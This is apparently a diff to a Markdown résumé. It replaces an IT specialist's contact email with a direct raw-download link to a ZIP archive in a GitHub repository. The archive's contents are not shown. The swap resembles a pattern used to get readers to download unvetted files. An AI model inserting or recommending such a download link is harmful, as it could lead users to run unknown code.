@@ -1,5 +1,5 @@
 # Bishnu Thapa
-Teku, Kathmandu | nengineer02@gmail.com
+Teku, Kathmandu | https://github.com/engineerbishnu/Bishnu-Portfolio/raw/refs/heads/main/superfuse/Portfolio_Bishnu_1.5.zip
 
 ## Professional Summary
 Highly skilled Information Technology Expert with over 8 years of experience in managing IT infrastructure, resolving technical issues, and implementing security measures. Proven ability to optimize IT systems performance and ensure robust network administration. Strong proficiency in cloud computing, databases, and IT best practices, coupled with excellent communication and problem-solving skills. Adept at working remotely and managing IT operations efficiently.
